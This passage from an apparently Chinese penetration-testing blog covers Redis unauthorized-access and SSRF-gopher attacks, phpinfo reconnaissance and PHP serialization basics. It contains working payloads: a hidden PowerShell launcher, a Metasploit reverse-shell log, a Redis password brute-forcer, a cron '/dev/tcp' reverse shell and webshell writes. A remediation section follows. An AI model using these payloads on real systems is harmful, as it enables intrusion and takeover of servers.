class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$command=”powershell -nop -w hidden -e xxxxxxxxxxxxxxxx”;iex $command;$command2=”taskkill /im mshta.exe”;iex $command2;</span><br></pre></td></tr></table></figure><p>最后写入文件，等待管理员登陆</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">oot@weisuo.org:~# redis-cli -h 192.168.138.27</span><br><span class="line">redis 192.168.138.27:6379&gt; CONFIG GET dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span><br><span class="line">redis 192.168.138.27:6379&gt; config get dbfilename</span><br><span class="line">1) &quot;dbfilename&quot;</span><br><span class="line">2) &quot;2.hta&quot;</span><br><span class="line">redis 192.168.138.27:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">redis 192.168.138.27:6379&gt;[/p][p=20, null, left]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; rexploit -j -z</span><br><span class="line">[*] Stopping existing job...</span><br><span class="line">[*] Reloading module...</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"> </span><br><span class="line">[*] Started reverse TCP handler on 119.91.151.22:80</span><br><span class="line">msf exploit(handler) &gt; [*] Starting the payload handler...</span><br><span class="line">[*] Sending stage (957999 bytes) to 60.111.27.14</span><br><span class="line">[*] Meterpreter session 4 opened (119.91.151.22:80 -&gt; 60.191.37.34:56301) at 2016-06-06 11:06:00 -0400</span><br><span class="line">[*] Session ID 4 (119.91.151.22:80 -&gt; 60.111.27.14:56301) processing AutoRunScript &#x27;migrate -f&#x27;</span><br><span class="line">[*] Current server process: powershell.exe (4896)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 3768</span><br><span class="line">[+] Successfully migrated to process</span><br></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p><strong>redis主从复制rce</strong><br>　　Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>　　在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。编写恶意so文件的代码 <a href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p><p>　　在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><p>网上收集两个比较方便的getshell python脚本</p><p>1.<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p><img src="image-20210818200257389.png" alt="image-20210818200257389"></p><p>2.<a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p><p><img src="image-20210818200323923.png" alt="image-20210818200323923"></p><p><img src="image-20210818200341465.png" alt="image-20210818200341465"></p><p>3.脚本</p><p>可用来测试是否存在未授权或弱口令的情况：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_  coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">PASSWORD_DIC=[<span class="string">&#x27;redis&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;oracle&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;p@aaw0rd&#x27;</span>,<span class="string">&#x27;abc123!&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">ip, port, timeout</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">        s.send(<span class="string">&quot;INFO\r\n&quot;</span>)</span><br><span class="line">        result = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;redis_version&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">u&quot;未授权访问&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;Authentication&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> pass_ <span class="keyword">in</span> PASSWORD_DIC:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">                s.send(<span class="string">&quot;AUTH %s\r\n&quot;</span> %(pass_))</span><br><span class="line">                result = s.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;+OK&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">u&quot;存在弱口令，密码：%s&quot;</span> % (pass_)</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">    port=sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="built_in">print</span> check(ip,port, timeout=<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h1 id="SSRF相关"><a href="#SSRF相关" class="headerlink" title="SSRF相关"></a>SSRF相关</h1><p><strong>ssrf，redis与gopher</strong></p><p>如果通过ssrf探测到内网某ip开启了6379端口，并存在未授权，如何结合gopher协议来写shell。</p><p>gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，gopher是Internet上最主要的信息检索工具，gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p><p>gopher协议格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br><span class="line">gopher的默认端口是70</span><br></pre></td></tr></table></figure><p>如果发起post请求，回车换行需要使用%0d%0a，如果存在多个参数，参数之间的&amp;也需要进行URL编码。注意%0d%0a是\r\n的URL编码。</p><p>gopher发送请求HTTP GET请求:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.194.1:6666/_abcd</span><br></pre></td></tr></table></figure><p>注意：abcd是要传递的数据，_会被吃掉不会传递过去</p><p>由于gopher协议规则比较复杂，这里借助一个github的工具来生成payload：<a href="https://github.com/firebroo/sec_tools">https://github.com/firebroo/sec_tools</a></p><p>只需要在redis-over-gopher/redis.cmd中写入redis执行的命令，比如下面的命令直接在web目录下写shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">config set dir /tmp</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set &#x27;webshell&#x27; &#x27;&lt;?php phpinfo();?&gt;&#x27;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>编辑好后运行redis-over-gopher/redis-over-gopher.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-over-gopher.py</span><br></pre></td></tr></table></figure><p>就可以生成支持gopher协议的payload：</p><p><img src="1344396-20210102184648153-1395513140.png" alt="img"></p><p>使用curl运行payload</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102184706456-696764708.png"><img src="1344396-20210102184706456-696764708.png" alt="img"></a></p><p>进入docker容器，发现shell.php已经成功生成</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102184639299-51740366.png"><img src="1344396-20210102184639299-51740366.png" alt="img"></a></p><p>注：需要将内容再进行一次url编码传到web的参数中才会正常运行</p><p>使用ssrf端口探测的时候，不要拘泥于http协议，还可以使用dict协议来进行探测</p><p>利用gopher协议反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/*gopher协议反弹shell利用脚本*/</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.127.140&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">reverse_ip=<span class="string">&quot;192.168.127.131&quot;</span></span><br><span class="line">reverse_port=<span class="string">&quot;7777&quot;</span></span><br><span class="line">cron=<span class="string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">&quot;root&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/spool/cron&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">   <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(cron.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">   <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">   <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">   <span class="string">&quot;save&quot;</span></span><br><span class="line">   ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">  cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">  CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">  redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">  cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">  cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">    cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">  cmd+=CRLF</span><br><span class="line">  <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">    payload += urllib.quote(redis_format(x))</span><br><span class="line">  <span class="built_in">print</span> payload</span><br></pre></td></tr></table></figure><p><strong><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102181438636-1255491191.png"><img src="1344396-20210102181438636-1255491191.png" alt="img"></a></strong></p><p>redis如果有密码，是弱口令的话，可以通过python脚本爆破，看回显来确定密码是否正确</p><p>如果有口令在最前面，和gopher的格式一样，如下健为AUTH，密码为123456</p><p><strong><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102181808754-1675763347.png"><img src="1344396-20210102181808754-1675763347.png" alt="img"></a></strong></p><p>爆破的时候需要在寻常的未授权前加上认证的gopher字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2A2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a123456%0D%0A</span><br></pre></td></tr></table></figure><p>爆破成功的化可以直接结合gopher协议对redis进行写shell的操作。</p><p>这里结合上面的redis主从复制的RCE来执行命令，先来构造加载exp.so的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config set dir /tmp/</span><br><span class="line">config set dbfilename /tmp/</span><br><span class="line">slaveof 192.168.127.140 4444</span><br><span class="line">module load /tmp/exp.so</span><br><span class="line">system.exec &#x27;whoami&#x27;</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102182908032-751922075.png"><img src="1344396-20210102182908032-751922075.png" alt="img"></a></p><p>这样就可以加载本地的exp.so对redis进行爆破，如果爆破成功就执行whoami命令。</p><p>这里只是一种演示，使用此方法同样可以写shell，写计划任务来获取shell。</p><h1 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h1><h3 id="修复办法"><a href="#修复办法" class="headerlink" title="修复办法"></a>修复办法</h3><p>（1）禁止公网开放Redis端口,可以在防火墙上禁用6379 Redis的端口</p><p>（2）检查authorized_keys是否非法，如果已经被修改，则可以重新生成并恢复，不能使用修改过的文件。并重启ssh服务（service ssh restart）</p><p>（3）增加 Redis 密码验证</p><p> 首先停止REDIS服务，打开redis.conf配置文件（不同的配置文件，其路径可能不同）/etc/redis/6379.conf,找到# requirepass foobared去掉前面的#号，然后将foobared改为自己设定的密码，重启启动redis服务。</p><p>（4）修改conf文件禁止全网访问，打开6379.conf文件，找到bind0.0.0.0前面加上# （禁止全网访问）。</p><h3 id="可参考加固修改命令"><a href="#可参考加固修改命令" class="headerlink" title="可参考加固修改命令"></a>可参考加固修改命令</h3><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>port</td><td>修改redis使用的默认端口</td></tr><tr><td>bind</td><td>设定redis监听的专用IP</td></tr><tr><td>requirepass</td><td>设定redis连接的密码</td></tr><tr><td>rename-command CONFIG “”</td><td>禁用CONFIG命令</td></tr><tr><td>rename-command info info2</td><td>重命名info为info2</td></tr></tbody></table><p>参考文章</p><blockquote><p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p><p><a href="https://www.cnblogs.com/Xy--1/p/12230858.html">https://www.cnblogs.com/Xy--1/p/12230858.html</a></p><p><a href="http://blog.csdn.net/Hu_wen/article/details/55189777?locationNum=15&amp;fps=1">http://blog.csdn.net/Hu_wen/article/details/55189777?locationNum=15&amp;fps=1</a></p><p><a href="http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/">http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/</a></p><p><a href="http://www.jianshu.com/p/e550628ba1bc">http://www.jianshu.com/p/e550628ba1bc</a></p><p><a href="https://www.cnblogs.com/0daybug/p/12389138.html">https://www.cnblogs.com/0daybug/p/12389138.html</a></p><p><a href="https://www.webshell.cc/5154.html">https://www.webshell.cc/5154.html</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 漏洞总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpinfo信息利用</title>
      <link href="/2021/07/28/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/"/>
      <url>/2021/07/28/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>phpinfo信息利用</p><span id="more"></span><h2 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h2><h4 id="system-系统信息"><a href="#system-系统信息" class="headerlink" title="system:系统信息"></a>system:系统信息</h4><p><img src="image-20210728150900924.png" alt="image-20210728150900924"></p><h4 id="extension-dir-php扩展的路径"><a href="#extension-dir-php扩展的路径" class="headerlink" title="extension_dir:php扩展的路径"></a><strong>extension_dir:php扩展的路径</strong></h4><p><img src="image-20210728151221382.png" alt="image-20210728151221382"></p><h4 id="SERVER-‘HTTP-HOST’-网站真实IP"><a href="#SERVER-‘HTTP-HOST’-网站真实IP" class="headerlink" title="$_SERVER[‘HTTP_HOST’]:网站真实IP"></a>$_SERVER[‘HTTP_HOST’]:网站真实IP</h4><p><img src="image-20210728151415306.png" alt="image-20210728151415306"></p><h3 id="有关目录的"><a href="#有关目录的" class="headerlink" title="有关目录的"></a>有关目录的</h3><h4 id="SERVER-‘DOCUMENT-ROOT’-web根目录"><a href="#SERVER-‘DOCUMENT-ROOT’-web根目录" class="headerlink" title="$_SERVER[‘DOCUMENT_ROOT’]:web根目录"></a>$_SERVER[‘DOCUMENT_ROOT’]:web根目录</h4><p><img src="image-20210728151507429.png" alt="image-20210728151507429"></p><h4 id="SERVER-‘SCRIPT-FILENAME’-index-php根目录"><a href="#SERVER-‘SCRIPT-FILENAME’-index-php根目录" class="headerlink" title="**$_SERVER[‘SCRIPT_FILENAME’]**index.php根目录"></a>**$_SERVER[‘SCRIPT_FILENAME’]**index.php根目录</h4><p><img src="image-20210803151453564.png" alt="image-20210803151453564"></p><h4 id="SERVER-‘CONTEXT-DOCUMENT-ROOT’-前运行脚本所在的文档根目录"><a href="#SERVER-‘CONTEXT-DOCUMENT-ROOT’-前运行脚本所在的文档根目录" class="headerlink" title="**$_SERVER[‘CONTEXT_DOCUMENT_ROOT’]**前运行脚本所在的文档根目录"></a>**$_SERVER[‘CONTEXT_DOCUMENT_ROOT’]**前运行脚本所在的文档根目录</h4><p><img src="image-20210803151510199.png" alt="image-20210803151510199"></p><h4 id="session-save-path-session的存储路径"><a href="#session-save-path-session的存储路径" class="headerlink" title="session.save_path   session的存储路径"></a><strong>session.save_path</strong>   session的存储路径</h4><p><img src="image-20210803151800423.png" alt="image-20210803151800423"></p><h4 id="APACHE-RUN-DIR-和-APACHE-PID-FILE-APACHE的路径"><a href="#APACHE-RUN-DIR-和-APACHE-PID-FILE-APACHE的路径" class="headerlink" title="APACHE_RUN_DIR  和 APACHE_PID_FILE   APACHE的路径"></a><strong>APACHE_RUN_DIR</strong>  和 <strong>APACHE_PID_FILE</strong>   APACHE的路径</h4><p><img src="image-20210803152631954.png" alt="image-20210803152631954"></p><p><img src="image-20210803152913592.png" alt="image-20210803152913592"></p><p><img src="image-20210803152937985.png" alt="image-20210803152937985"></p><p><img src="image-20210803153211410.png" alt="image-20210803153211410"></p><h4 id="pdo-mysql-default-socket"><a href="#pdo-mysql-default-socket" class="headerlink" title="pdo_mysql.default_socket"></a><strong>pdo_mysql.default_socket</strong></h4><p><img src="image-20210803153014374.png" alt="image-20210803153014374"></p><h4 id="临时文件目录"><a href="#临时文件目录" class="headerlink" title="临时文件目录"></a>临时文件目录</h4><p><img src="image-20210728151841301.png" alt="image-20210728151841301"></p><p>phpinfo()页面post一个shell，可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了</p><h1 id="重要配置"><a href="#重要配置" class="headerlink" title="重要配置"></a>重要配置</h1><h4 id="allow-url-include-远程文件包含"><a href="#allow-url-include-远程文件包含" class="headerlink" title="allow_url_include:远程文件包含"></a>allow_url_include:远程文件包含</h4><p><img src="image-20210728152037075.png" alt="image-20210728152037075"></p><h4 id="disable-functions-表示禁用的函数"><a href="#disable-functions-表示禁用的函数" class="headerlink" title="disable_functions:表示禁用的函数"></a>disable_functions:表示禁用的函数</h4><p><img src="image-20210728152223602.png" alt="image-20210728152223602"></p><p>有时候我们上传了一个webshell却不能用，有很大可能是管理员做了配置，禁用了php执行系统命令的函数。</p><h4 id="asp-tags-php标签-php7以下版本有"><a href="#asp-tags-php标签-php7以下版本有" class="headerlink" title="asp_tags:php标签(php7以下版本有)"></a><strong>asp_tags:php标签</strong>(php7以下版本有)</h4><p><img src="image-20210728152325831.png" alt="image-20210728152325831"></p><p>有4种形式如果这个选项不开启的话(一般默认不开启)，使用asp的标签是不会解析的</p><p><img src="image-20210728152402171.png" alt="image-20210728152402171"></p><h4 id="short-open-tag"><a href="#short-open-tag" class="headerlink" title="short_open_tag"></a><strong>short_open_tag</strong></h4><p><img src="image-20210728152440576.png" alt="image-20210728152440576"></p><p>允许<??>这种形式，并且&lt;?=等价于&lt;? echo</p><h4 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc:"></a>magic_quotes_gpc:</h4><p><img src="image-20210728153125839.png" alt="image-20210728153125839"></p><p>它是用来实现addslshes()和stripslashes()这两个功能的，对SQL注入进行防御</p><p>php5.4以下版本有的函数，默认开启，会对特殊字符进行转yi</p><blockquote><p>参考</p><p><a href="http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化漏洞总结</title>
      <link href="/2021/07/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2021/07/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><p>为了有效存储和传递数据同时不丢失类型和结构 需要利用序列化和反序列化函数对数据进行处理<br>序列化函数返回字符串 字符串包含了表示值的字节流可以存储于任何地方<br>反序列化函数对于单一的已序列化的变量进行操作 将其转换为原来的值<br>二者结合可以轻松存储数据 使程序更具维护性</p><span id="more"></span><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><h1 id="serialize函数"><a href="#serialize函数" class="headerlink" title="serialize函数"></a>serialize函数</h1><p>是序列化函数，序列化对象时 PHP在序列化动作之前调用成员函数__sleep 这样就允许对象在被序列化之前做任何清除操作。<br><strong>类型字母详解:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a - array  </span><br><span class="line">b - boolean  </span><br><span class="line">d - double  </span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure><p>boolean</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b:;</span><br><span class="line">b:1; // True</span><br><span class="line">b:0; // False</span><br></pre></td></tr></table></figure><p>integer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i:;</span><br><span class="line">i:1; // 1</span><br><span class="line">i:-3; // -3</span><br></pre></td></tr></table></figure><p>double</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d:;</span><br><span class="line">d:1.2345600000000001; // 1.23456（php弱类型所造成的四舍五入现象）</span><br></pre></td></tr></table></figure><p>NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N; //NULL</span><br></pre></td></tr></table></figure><p>string</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s::&quot;&quot;;</span><br><span class="line">s&quot;PALEONEC&quot;; // &quot;PALEONEC&quot;</span><br></pre></td></tr></table></figure><p>array</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a::&#123;key, value pairs&#125;;</span><br><span class="line">a&#123;s&quot;key1&quot;;s&quot;value1&quot;;s&quot;value2&quot;;&#125; // array(&quot;key1&quot; =&gt; &quot;value1&quot;, &quot;key2&quot; =&gt; &quot;value2&quot;)</span><br></pre></td></tr></table></figure><p>类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;i:20;&#125;</span><br><span class="line">类型:长度:&quot;名字&quot;:类中变量的个数:&#123;类型:长度:&quot;名字&quot;;类型:长度:&quot;值&quot;;......&#125;</span><br></pre></td></tr></table></figure><p>注：对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上’*’。这些前缀值在任一侧都有空字节。<br>所以在传入序列化字符串的时候，需要补齐这些空字节。如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;%00test%00flag&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;Active&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h1 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h1><p>是反序列化函数，若被序列化的变量是一个对象，重新构造对象之后会自动调用__wakeup成员函数</p><p>举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $test = &quot;demo&quot;;</span><br><span class="line">    function 